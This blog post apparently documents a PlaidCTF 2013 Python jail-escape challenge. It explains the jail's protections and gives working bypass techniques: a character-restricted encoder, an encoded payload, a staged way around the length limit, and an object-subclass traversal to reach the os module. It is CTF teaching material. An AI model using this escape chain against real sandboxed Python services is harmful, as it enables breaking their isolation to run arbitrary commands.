---
layout: post
title: "A python's escape from PlaidCTF jail"
author: wapiflapi
tags:
- jail
- CTF
- PlaidCTF
- escape
- writeup
- python
- pyjail
---

Python jails are pretty common among CTF challenges. Often a good knowledge of
the interpreter's internals gets you a long way. For the non initiated it might
sometimes seem like black magic. PlaidCTF offered a challenging task that
required the combination of some different techniques and logic.

This time there was a service listening on the remote server, with a python
script called for each new connection. We were told we had to get a shell
because we couldn't guess where the flag was stored. Another important detail
is that the challenge was running on python2.6.6.

The script was given to us and you can find its code
[here](http://www.pnuts.tk/data/plaid2k13/pyjail/pyjail.py-ae426f39b325ed99123f590c8a8bbe224fefb406).


# Overview

Basically it sets up a jail, and then executes user input after some restricting
checks. I shall present the different protections before explaining how we can
bypass most of them, and finally escape from this jail.

```python
from sys import modules
modules.clear()
del modules
```

`sys.modules` is a dictionary that contains all the modules which where imported
since the interpreter started. Clearing the modules breaks a lot of things. It
breaks a lot of stuff because often a standard function will check if some
module is present. But deleting the modules altogether breaks even more code,
because now the check itself raises an exception!

The next step in setting up the jail's environment is this:

```python
__builtins__.__dict__.clear()
__builtins__ = None
```

This is pretty self explanatory. It clears the dictionary python uses to find
its builtins and we can't use them anymore except if we already have a reference
to the builtin we need somewhere else.

There is one protection left, but it doesn’t try to limit what we can do, it
only tries to make it harder by filtering out certain characters and imposing a
length limit. Notice that the script calls `_raw_input`, which is just backup it
made of `raw_input` before clearing the builtins.

```python
inp = _raw_input()
inp = inp.split()[0][:1900]
#Dick move: you also have to only use the characters that my solution did.
inp = inp.translate("".join(map(chr, xrange(256))),
'"!#$&*+-/0123456789;=>?ABCDEFGHIJKLMNOPQRSTUVWXYZ\\^ab
cdefghijklmnopqrstuvwxyz|')
```

Basically this means our input should be 1900 bytes or less, and should only
contain characters in the `set([':', '%', "'", '`', '(', ',', ')', '}', '{',
'[', '.', ']', '<', '_', '~'])`, the split ensures there can't be any white-
spaces. It's important to note that we are also allowed to use most of the non
printable characters if we want to.

After all this we finally get to the interesting part: code execution! We are
lucky because it is in two stages, so we have twice the fun :-)

```python
exec 'a=' + _eval(inp, {}) in {}
```

Don't be fooled. The eval is not in the exec. It could be written like this:

```python
cmd = 'a=' + _eval(inp, {})
exec cmd in {}
```

Quick reminder, in python `eval` is used to evaluate an expression and returns
its value whereas `exec` is a statement that compiles and executes a set of
statements. In short this means you can execute statements when you are using
`exec` but not when using `eval`.

The empty dict given to `eval` as its second parameter and the `in {}` after the
`exec` both mean the same thing, that the code should be evaluated in a new
empty scope. So we can't (in theory) pass stuff from the `eval` to the `exec`,
or interact with the outer-world in any way.

Most of python are just references, and this we can see here again. These
protections only remove references. The original modules like `os`, and the
builtins are not altered in any way. Our task is quiet clear, we need to find a
reference to something useful and use it to find the flag on the file
system. But first we need to find a way of executing code with this little
characters allowed.


# Running code

How do we get code running with only characters from `set([':', '%', "'", '`',
'(', ',', ')', '}', '{', '[', '.', ']', '<', '_', '~'])`? Answer: It's python,
python is fun, let's have some fun.

We have everything we need to build tuples `()`, lists `[]` and dictionaries
`{:}`.  If it was python 2.7 we could also make sets using `{}` but sadly that
isn't the case. We can also build strings using `' '` and we could use `%` to do
some formatting. The comma will obviously help when building tuples or lists,
and the dot might be useful to access attributes.

We haven't talked about `<`, `~`, `_` and `` ` ``, yet. `<` and `~` are simple
operators, we can do less-than comparison and binary-negation. `_` would be a
way to have something valid for a variable identifier, but we do not have `=` so
that might not be of much use.

Now, if you are like me and didn't know `` ` `` actually did something in
python2 you might be surprised! As it turns out `` `x` `` is equivalent to
`repr(x)`!  This means we can produce strings out of objects.

Some of these symbols can be used for multiple purposes, `%` can be used for
string formatting but also for integer modulo and `<` can be used both for
comparing to integers and in the form of `<<` binary-shifting them to the left

We can see that most of the characters we are allowed to use are pretty useful
and I dare say it is easier doing python with only those than it would be
without them!

Remember we have two execution stages, first the `eval`, then the `exec`. The
`exec` executes what the `eval` returns. So we should consider the `eval` as a
decoder. The 1900 character limit is supposed to force you to think a lot about
this, but we bypassed it (as I will explain later), that is why we didn't put to
much thought into the encoding scheme.

The first thing to notice is that `[]<[]` is `False`, which is pretty
logical. What is less explainable but serves us well is the fact that `{}<[]`
evaluates to `True`.

`True` and `False`, when used in arithmetic operations, behave like `1` and
`0`. This will be the building block of our decoder but we still need to find a
way to actually produce arbitrary strings.

## Getting characters

Let's start with a generic solution, we will improve on it later. Getting the
numeric ASCII values of our characters seems doable with `True`, `False`, `~`
and `<<`. But we need something like `str()` or `"%c"`. This is where the
invisible characters come in handy! `"\xcb"` for example, it's not even ascii as
it is larger than 127, but it is valid in a python string, and we can send it to
the server.

If we take its representation using `` `'_\xcb_'` `` (In practice we will send a
byte with the value `0xcb` *not* `'\xcb'`), we have a string containing a c. We
also need a `'%'`, and we need those two, and those two only.

We want this: `` `'%\xcb'`[1::3] `` , using True and False to build the numbers we
get:

```python
`'%\xcb'`[{}<[]::~(~({}<[])<<({}<[]))]
```

There you go! Now provided we can have any number build using the same trick as
for the indexes we just have to use the above and `%(number)` to get any
character we want.

Some optimization is possible for specific characters by finding them in the
representations of True, False and the invisible characters. As I am about to
bypass the length limit I didn't bother doing this to much.

## Numbers

This is where I failed during the CTF and what cost me the shame of getting
the flag five minutes after the end. Had I coded something to automate the
process of getting arbitrary numbers I wouldn't have missed spaces when I
finally got a shell. But more on that later. The point is I shall do it right
now.

If you have ever studied any logic you might have encountered the claim that
everything could be done with NAND gates. NOT-AND. This is remarkably close to
how we shall proceed, except for the fact we shall use multiply-by-two instead
of AND. We won't use True.

Everything can be done using only `False` (0), `~` (not), `<<` (x2), let me show
you with an example. We shall go from 42 to 0 using `~` and `/2`, then we can
revert that process using `~` and `*2`.

```python
 42 # /2
 21 # ~
-22 # /2
-11 # ~
 10 # /2
  5 # ~
 -6 # /2
 -3 # ~
  2 # /2
  1

True = ~(~(~(~(42/2)/2)/2)/2)/2/2
```

Basically we divided by two when we could, else we inverted all the bits. The
nice property of this is that when inverting we are guaranteed to be able to
divide by two afterward. So that finally we shall hit 1, 0 or -1.

But wait. Didn't I say we would not use True, 1? Yes I did, but I lied. We will
use it because True is obviously shorter than `~(~False*2)`, especially
considering the fact we will use True anyway to do x2, which in our case is of
course `<<({}<[])`.

Anyway, the moment we hit 1, 0 or -1 we can just use `True`, `False` or
`~False`.

So now we can reverse this and we have:

```python
42 = ~(~(~(~(1*2)*2)*2)*2)*2
```

Using what we are allowed to:

```python
42 = ~(~(~(~(({}<[])<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[])
```

How to not loose a CTF:

```python
def brainfuckize(nb):
    if nb in [-2, -1, 0, 1]:
        return ["~({}<[])", "~([]<[])",
		         "([]<[])",  "({}<[])"][nb+2]

    if nb % 2:
        return "~%s" % brainfuckize(~nb)
    else:
        return "(%s<<({}<[]))" % brainfuckize(nb/2)
```

I wonder if using % as a modulo might optimize the length of some of these
expressions. If you have any thoughts about this feel free to talk to me about
it!

## *And in the darkness bind them!*

Joining is not trivial, but there is a little trick that makes it quite easy.
If we were building a list of characters the representation of that list would
contain all those characters (obviously), and the best part is they should be
equally spaced. A simple slice should be enough to give us the complete string.

```pycon
>>> `['a', 'b', 'c', 'd']`[2::5]
'abcd'

>>> `['a', 'b', 'c', 'd']`[(({}<[])<<({}<[]))::~(~(({}<[])<<({}<[]))<<({}<[]))]
'abcd'
```

Since we have the ability to generate arbitrary numbers and single characters
this works well.

However *care must be taken* because this does not always work. In particular
when the representation of a character is composed of more than one character,
such cases include but are not limited to `\n`, `\t`, `\\`, etc... Luckily those
characters are seldom needed, and we won't use them.

We can now generate almost all the code we want from the `eval()` and it will be
passed to the exec statement!

Before moving on to the next step, let's enjoy some valid python code!

```python
    `[`'%\xcb'`[{}<[]::~(~({}<[])<<({}<[]))]%(((~(~(~(~(({}<[])<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))),`'%\xcb'`[{}<[]::~(~({}<[])<<({}<[]))]%((((~(~(~(~({}<[])<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))),`'%\xcb'`[{}<[]::~(~({}<[])<<({}<[]))]%(~(~(~(~((~(~({}<[])<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))),`'%\xcb'`[{}<[]::~(~({}<[])<<({}<[]))]%((((((({}<[])<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))),`'%\xcb'`[{}<[]::~(~({}<[])<<({}<[]))]%(~(((~((~(~({}<[])<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))),`'%\xcb'`[{}<[]::~(~({}<[])<<({}<[]))]%(~(~((((~(~({}<[])<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))),`'%\xcb'`[{}<[]::~(~({}<[])<<({}<[]))]%(~(~(~((~(~(~({}<[])<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))),`'%\xcb'`[{}<[]::~(~({}<[])<<({}<[]))]%(~(~(~(~((~(~({}<[])<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))),`'%\xcb'`[{}<[]::~(~({}<[])<<({}<[]))]%((((((({}<[])<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))),`'%\xcb'`[{}<[]::~(~({}<[])<<({}<[]))]%(~(~((~(~(~(~({}<[])<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))),`'%\xcb'`[{}<[]::~(~({}<[])<<({}<[]))]%(~((~((~((~({}<[])<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))),`'%\xcb'`[{}<[]::~(~({}<[])<<({}<[]))]%((((((({}<[])<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))),`'%\xcb'`[{}<[]::~(~({}<[])<<({}<[]))]%(~((((~(~(~({}<[])<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))),`'%\xcb'`[{}<[]::~(~({}<[])<<({}<[]))]%((~(((~(~(~({}<[])<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))),`'%\xcb'`[{}<[]::~(~({}<[])<<({}<[]))]%((~(((~(({}<[])<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[]))<<({}<[])))]`[(({}<[])<<({}<[]))::~(~(({}<[])<<({}<[]))<<({}<[]))]
```


# About python scopes

At this stage, and before trying to exploit anything, I think it might be useful
to give a quick aperçu of how python handles scopes. This won't explain
everything there is to know about it and I strongly suggest you should read more
about it is your are interested. If, however, you feel perfectly comfortable
with the way python handles and stores this stuff you may safely skip this
section.

There are two kinds of variables that I will talk about, namely _global_ and
_local_ variables. Of course, being python, there is no real difference between
the way a variable referring to a number, a class or a function, is handled.

## globals

What we usually call global variables are not in fact global in the same sense
as global variables in C would be. They are only global relative to the module
in which they are defined. When accessing them from outside there module you
would do for example: `math.pi` to access the global variable named `'pi'` in
the module `'math'`.

All the global variables in a module are stored in the module's `__dict__` which
is an attribute of the module. Modifing this `__dict__` has the same effect as
using `setattr` on the module.

One can get the current module's globals doing `sys.modules[__name__].__dict__`,
or more simply by calling `globals()`.

## locals

Local variables are those defined inside the scope of a function. In a way
similar to global variables, locals are stored in a dictionary that can be
accessed through the `f_locals` attribute of the code frame in which the
function is/was running. In the CPython implementation modifying the `f_locals`
wont affect the actual locals.

## from the outside

If we take a look at the code of `math.cos` we might expect it to use `math.pi`,
but it will probably be simply referenced as `pi`. When we call `math.cos` from
somewhere outside of math, `pi` wont be in the globals of the calling
module. Its interesting to learn how `cos` finds the reference on `pi`. During
the declaration of the function, a reference to the current globals (those of
the module in which it is declared) is kept in the function's `func_globals`
attribute.


# Exploiting

We are now able to run code quiet easily and the character problems are mostly
solved. (We still can't use some characters but we shall do without them)
However, some limits still remain. No builtins, no access to modules, and a
character limit. Let's solve that last problem first, that way it won't bother
us afterwards.

## Solving the length limit

To achieve this we shall add a third execution stage, the second stage (the
original exec statement), which can be triggered as many times as we want,
will be tasked with building the final payload. For this it will need to store
the query parts somewhere, and concatenate the new parts as they arrive.

We need a place to store stuff where we can comeback in the next exec. Finding
a place where we can comeback is easy.

If you have ever done any kind of python jail-escaping the following should be
familiar to you.

```python
().__class__.__base__.__subclasses__()
```

This get's the `tuple`'s type's (`().__class__`) parent (`__base__`) which is
`object`, then lists all its subclasses that python knows of. Somewhere in those
we should be able to find one which we are allowed to call `setattr` on. Indeed
we are lucky and find:

```pycon
>>> ().__class__.__base__.__subclasses__()[-2]
<class 'codecs.IncrementalDecoder'>

>>> ().__class__.__base__.__subclasses__()[-2].test = "wapiflapi"
>>> print ().__class__.__base__.__subclasses__()[-2].test
wapiflapi
```

**All the code should work on python 2.6.6, but it is trivial to adapt to other versions.**

Neat, we can store stuff in this and come back to it later. That's all we need
for our second stage, we are ready to receive the parts from eval, concatenate
them into our storage and finally exec the whole payload when we are done.

#### Battle plan:

* Stage 1, original `eval()`
  * Decode input and generate the python code
  * **This bypasses the character limit**
* Stage 2, original `exec`
  * Concatenate stage 1's output
  * exec when ready
  * **This bypasses the length limit**
* Stage 3, `exec` by stage 2
  * Actual payload, will hopefully get us a shell
  * **This gets out of jail**

This basically solves the problem at hand (the length limit), the code is
pretty trivial and will be shown later when putting everything together. Let's
first find-out how to really escape from jail.


## Getting out

We want a shell, we want `system`, `execv`, `fork`, `dup`, in short we want the
`os` module. Where can we find it? We need to look for a module or function that
has a reference on `os` or on something that has a reference on something like
that. Here experience plays a big role, and we know from experience that the
warnings module is loaded by default and has a lot of _nice_ references. If we
can get its globals we should be fine.

What we normally try, and it worked for the NDH Prequals is :

```pycon
>>> [x for x in ().__class__.__base__.__subclasses__() if x.__name__ == "catch_warnings"][0]()._module
<module 'warnings' from '/usr/lib/python2.7/warnings.pyc'>
```

This gives us the module straightaway, no questions asked. It's so easy because
`catch_warnings` keeps a reference to its module. But it didn't work this time
because `catch_warnings` uses `sys.modules` to get that reference, and thus it
fails. (They are `.clear()`ed, remember?)

```pytb
Traceback (most recent call last):
  File "/Python-2.6.6/Lib/warnings.py", line 333, in __init__
    self._module = sys.modules['warnings'] if module is None else module
KeyError: 'warnings'
```

But we still have a way of getting that reference, we saw that functions kept
a reference to the globals of the modules in which they where defined. We only
have to find a real function in `catch_warnings` and we should be good to go.

After some searching we find out `catch_warnings.__repr__` is backed by a real
function. `__repr__` itself is an 'instancemethod' not a function, but it's
trivial to get the function using `__repr__.im_func`

Then it's only a matter of getting `warnings'` globals using `func_global` which
is a reference to it.

```pycon
>>> g_warnings = [x for x in ().__class__.__base__.__subclasses__() if x.__name__ == "catch_warnings"][0].__repr__.im_func.func_globals
>>> print g_warnings["linecache"].os
<module 'os' from '/Python-2.6.6/Lib/os.pyc'>
```

`warnings` imports `linecache` which in turn imports `os`. We don't import
anything and that is why doing things like this doesn’t disturb the broken
mess caused by `sys.modules.clear()`.

# Reunion

Now we know everything. We know how to escape the jail, we know how to have
enough space to do so and we know how to use the characters we want to craft our
code. The only think we miss is putting all this together. And it's pretty easy.

I'd like to thank PPP for their CTF, I really enjoyed it. Also thank you to all
the people who helped me learning python and some of its _secrets_.



